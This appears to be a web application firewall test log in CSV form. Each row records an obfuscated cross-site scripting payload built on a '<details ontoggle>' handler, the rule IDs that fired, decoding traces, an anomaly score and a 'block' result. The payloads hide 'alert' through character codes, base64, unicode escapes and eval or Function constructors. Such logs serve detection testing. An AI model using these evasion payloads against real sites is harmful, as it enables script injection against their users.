371,"<details open ontoggle=""(function(){var x=String.fromCharCode(97,108,101,114,116);top[x](1);})()"">",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o81,4v217,98 || o85,11v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,6v217,98t:urlDecodeUni,t:compressWhitespace || ",30,177826446961.636828
372,"<details open ontoggle=""(function(){var x=String.fromCharCode(97,108,101,114,116);parent[x](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o88,11v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826447173.367166
374,"<details open ontoggle=""(function(){var x=String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116);window[x](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o172,11v217,185t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,185 || o25,11v217,185t:urlDecodeUni || v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o166,9v217,185t:urlDecodeUni,t:compressWhitespace || ",30,177826447554.137202
375,"<details open ontoggle=""(function(){var a=String,b=a.fromCharCode,c=b(97,108,101,114,116);window[c](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o96,11v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,109 || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o90,9v217,109t:urlDecodeUni,t:compressWhitespace || ",25,177826447782.127519
377,"<details open ontoggle=""(function(){var x=`\u0061\u006c\u0065\u0072\u0074`;window[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o81,11v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o75,9v217,94t:urlDecodeUni,t:compressWhitespace || ",25,177826448299.443404
378,"<details open ontoggle=""(function(){var x='&#97;&#108;&#101;&#114;&#116;'.replace(/&#(\d+);/g,(m,n)=>String.fromCharCode(n));window[x](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o131,11v217,144t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,144 || o25,11v217,144t:urlDecodeUni || v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o125,9v217,144t:urlDecodeUni,t:compressWhitespace || ",30,177826448446.195413
379,"<details open ontoggle=""(function(){var x=[0x61,0x6c,0x65,0x72,0x74].map(n=>String.fromCharCode(n)).join('');window[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o115,11v217,128t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,128 || v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o109,9v217,128t:urlDecodeUni,t:compressWhitespace || ",25,177826448666.927389
381,"<details open ontoggle=""(function(){var x=decodeURI('%61%6c%65%72%74');window[x](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o67,11v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,90 || o25,11v217,90t:urlDecodeUni || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,9v217,90t:urlDecodeUni,t:compressWhitespace || ",30,177826449061.190519
382,"<details open ontoggle=""(function(){var x=String.fromCharCode(97,108,101,114,116);window[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o88,11v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v217,101t:urlDecodeUni,t:compressWhitespace || ",25,177826449222.774001
383,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ=');self[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o63,11v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,7v217,76t:urlDecodeUni,t:compressWhitespace || ",25,177826449436.615309
384,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ=');top[x](1);})()"">",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o58,4v217,75 || o62,11v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,75 || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,6v217,75t:urlDecodeUni,t:compressWhitespace || ",30,177826449676.811134
385,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ=');parent[x](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o65,11v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826449815.802223
389,"<details open ontoggle=""(function(){var y=atob('YWxlcnQ=');window[y](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o65,11v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,78t:urlDecodeUni,t:compressWhitespace || ",25,177826450638.032532
390,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ=');window[x].call(null,1);})()"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,88t:urlDecodeUni,t:compressWhitespace || ",20,177826450918.773086
391,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ=');window[x].apply(null,[1]);})()"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,91t:urlDecodeUni,t:compressWhitespace || ",20,17782645112.886846
392,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ=');globalThis[x](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o69,11v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17782645135.098271
393,"<details open ontoggle=""(function(){var a=[atob('YWxlcnQ=')];window[a[0]](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o67,14v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,11v217,83t:urlDecodeUni,t:compressWhitespace || ",25,177826451544.745276
394,"<details open ontoggle=""(function(){var x='al'+'ert';window[x](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o59,11v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,72 || o25,11v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,9v217,72t:urlDecodeUni,t:compressWhitespace || ",30,177826451717.569486
395,"<details open ontoggle=""(function(){var x=String.fromCharCode(0x61,0x6c,0x65,0x72,0x74);window[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o94,11v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,107t:urlDecodeUni,t:compressWhitespace || ",25,17782645207.392729
396,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ=');window[''+x](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o65,14v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,81 || o25,11v217,81t:urlDecodeUni || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,12v217,81t:urlDecodeUni,t:compressWhitespace || ",30,177826452295.242536
397,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ=');(window)[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o59,19v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o60,10v217,80t:urlDecodeUni,t:compressWhitespace || ",25,177826452443.154617
398,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ=');(1,window[x])(1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o68,12v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,9v217,82t:urlDecodeUni,t:compressWhitespace || ",25,177826452635.735277
399,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ=');Reflect.get(window,x)(1);})()"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782645288.295952
400,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ=');Reflect.apply(window[x],null,[1]);})()"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,99 || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o73,9v217,99t:urlDecodeUni,t:compressWhitespace || ",20,177826453076.010017
401,"<details open ontoggle=""(function(){var x=atob(String.fromCharCode(89,87,120,108,99,110,81,61));window[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o102,11v217,115t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,115 || v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o96,9v217,115t:urlDecodeUni,t:compressWhitespace || ",25,177826453242.721330
402,"<details open ontoggle=""(function(){top['al'+'ert'](1)})()""></details>",0,1,block,8,"932105,933210,934100,934100,941100,941120,941370,949110","o33,6v217,70 || o24,34v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,70 || o25,11v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,15v217,70t:urlDecodeUni,t:compressWhitespace || ",35,177826453419.956385
403,"<details open ontoggle=""(function(){self['al'+'ert'](1)})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,35v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,71 || o25,11v217,71t:urlDecodeUni || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,16v217,71t:urlDecodeUni,t:compressWhitespace || ",30,177826453666.950386
404,"<details open ontoggle=""(function(){parent['al'+'ert'](1)})()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,37v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,73 || o25,11v217,73t:urlDecodeUni || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826453847.138854
405,"<details open ontoggle=""(function(){frames['al'+'ert'](1)})()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,37v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,73 || o25,11v217,73t:urlDecodeUni || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826454167.862069
412,"<details open ontoggle=""(function(){[]['find']['constructor']('al'+'ert(1)')()})()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,58v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,94 || o25,11v217,94t:urlDecodeUni || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826455694.609058
413,"<details open ontoggle=""(function(){globalThis['al'+'ert'](1)})()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,41v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || o25,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826455966.010431
414,"<details open ontoggle=""(function(){(1,window['al'+'ert'])(1)})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,41v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || o25,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o39,18v217,77t:urlDecodeUni,t:compressWhitespace || ",30,177826456161.788222
419,"<details open ontoggle=""(function(){[1]['map']['constructor']('al'+'ert(1)')()})()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,58v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,94 || o25,11v217,94t:urlDecodeUni || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826457125.954251
420,"<details open ontoggle=""(function(){[1]['find']['constructor']('al'+'ert(1)')()})()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,59v217,95t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,95 || o25,11v217,95t:urlDecodeUni || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826457327.736702
421,"<details open ontoggle=""(function(){(0,top['al'+'ert'])(1)})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,38v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,74 || o25,11v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o39,15v217,74t:urlDecodeUni,t:compressWhitespace || ",30,177826457541.825785
422,"<details open ontoggle=""(function(){with(this){[].constructor.constructor('al'+'ert(1)')()}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,71v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,97 || o25,11v217,97t:urlDecodeUni || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,8v217,97t:urlDecodeUni,t:compressWhitespace || ",30,177826457794.187795
423,"<details open ontoggle=""(function(){with(this){(1,eval)('al'+'ert(1)')}})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,51v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || o25,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17782645799.230966
424,"<details open ontoggle=""(function(){with(this){window['ev'+'al']('al'+'ert(1)')}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,60v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,86 || o25,11v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,23v217,86t:urlDecodeUni,t:compressWhitespace || ",30,17782645816.257362
426,"<details open ontoggle=""(function(){with(this){top['e'+'val']('al'+'ert(1)')}})()"">",0,1,block,8,"932105,933210,934100,934100,941100,941120,941370,949110","o46,4v217,83 || o24,57v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,83 || o25,11v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,20v217,83t:urlDecodeUni,t:compressWhitespace || ",35,177826458685.863338
427,"<details open ontoggle=""(function(){with(this){self['ev\x61l']('al'+'ert(1)')}})()"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,84 || o25,11v217,84t:urlDecodeUni || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,21v217,84t:urlDecodeUni,t:compressWhitespace || ",25,177826458863.211333
428,"<details open ontoggle=""(function(){with(this){parent[String.fromCharCode(101,118,97,108)]('al'+'ert(1)')}})()"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,112 || o25,11v217,112t:urlDecodeUni || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,49v217,112t:urlDecodeUni,t:compressWhitespace || ",25,177826459087.080147
429,"<details open ontoggle=""(function(){with(this){globalThis['e'+'val']('al'+'ert(1)')}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,64v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,90 || o25,11v217,90t:urlDecodeUni || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,27v217,90t:urlDecodeUni,t:compressWhitespace || ",30,177826459288.901010
430,"<details open ontoggle=""(function(){with(this){Function('al'+'ert(1)')()}})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,53v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || o25,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826459489.059195
431,"<details open ontoggle=""(function(){with(this){[]['constructor']['constructor']('al'+'ert(1)')()}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,77v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,103 || o25,11v217,103t:urlDecodeUni || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,8v217,103t:urlDecodeUni,t:compressWhitespace || ",30,177826459677.752703
432,"<details open ontoggle=""(function(){with(this){('')['constructor']['constructor']('al'+'ert(1)')()}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,79v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,105 || o25,11v217,105t:urlDecodeUni || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,25v217,105t:urlDecodeUni,t:compressWhitespace || ",30,177826459823.278147
433,"<details open ontoggle=""(function(){with(this){(1)['constructor']['constructor']('al'+'ert(1)')()}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,78v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,104 || o25,11v217,104t:urlDecodeUni || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,24v217,104t:urlDecodeUni,t:compressWhitespace || ",30,177826460151.045079
434,"<details open ontoggle=""(function(){with(this){window['\u0065val']('al'+'ert(1)')}})()"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,88 || o25,11v217,88t:urlDecodeUni || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,25v217,88t:urlDecodeUni,t:compressWhitespace || ",25,177826460391.032399
435,"<details open ontoggle=""(function(){with(this){this['e\u0076al']('al'+'ert(1)')}})()"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,86 || o25,11v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,23v217,86t:urlDecodeUni,t:compressWhitespace || ",25,177826460525.878498
436,"<details open ontoggle=""(function(){with(this){Reflect.get(window,'e'+'val')('al'+'ert(1)')}})()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,98 || o25,11v217,98t:urlDecodeUni || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826460744.990847
437,"<details open ontoggle=""(function(){with(this){({}).constructor.constructor('al'+'ert(1)')()}})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,73v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,99 || o25,11v217,99t:urlDecodeUni || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826460924.994567
439,"<details open ontoggle=""(function(){with(this){window['e\u0076\u0061l']('al'+'ert(1)')}})()"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,93 || o25,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,30v217,93t:urlDecodeUni,t:compressWhitespace || ",25,177826461366.065432
440,"<details open ontoggle=""(function(){with(this){setTimeout['constructor']('al'+'ert(1)')()}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,70v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,96 || o25,11v217,96t:urlDecodeUni || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,31v217,96t:urlDecodeUni,t:compressWhitespace || ",30,177826461517.755061
